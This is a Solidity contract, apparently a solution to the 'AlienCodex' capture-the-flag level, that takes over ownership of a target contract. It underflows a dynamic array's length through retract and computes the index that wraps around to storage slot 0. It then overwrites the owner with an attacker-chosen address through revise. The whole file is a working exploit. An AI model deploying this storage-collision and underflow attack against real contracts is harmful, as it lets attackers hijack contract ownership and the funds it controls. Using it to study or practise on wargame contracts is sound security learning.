// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import {AlienCodex} from "./AlienCodex.sol";

contract AlienCodexAttack {
    AlienCodex target;

    constructor(address _target) public {
        target = AlienCodex(_target);
    }

    function run(address newOwner) public {
        target.makeContact();
        target.retract();

        uint256 codexSlot = 1;
        uint256 codexPointer = uint256(keccak256(abi.encode(codexSlot)));
        uint256 ownerLocation = ~uint256(0) - codexPointer + 1;

        target.revise(ownerLocation, bytes32(uint256(uint160(newOwner))));
    }
}
